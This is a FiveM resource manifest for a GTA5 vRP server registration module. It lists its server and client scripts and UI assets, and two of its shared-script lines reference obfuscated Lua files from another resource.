shared_script '@flv-register/ai_module_fg-obfuscated.lua'
shared_script '@flv-register/shared_fg-obfuscated.lua'
fx_version 'adamant'
game 'gta5'

server_scripts {
    "@vrp/lib/utils.lua",
    'server.lua'
}

client_scripts {
    "@vrp/client/Proxy.lua",
    "@vrp/client/Tunnel.lua",
    'client.lua',
    'register.lua'
}

lua54 'yes'

files {
    'ui/index.html',
    'ui/loading.html',

    'ui/style.css',
    'ui/register.css',

    'ui/*.js',

    'ui/fonts/*.otf',
    'ui/fonts/*.ttf',
    'ui/fonts/*.woff2',

    'ui/images/*.png',
    'ui/images/*.webm'
}

ui_page 'ui/index.html'
-- loadscreen 'ui/loading.html'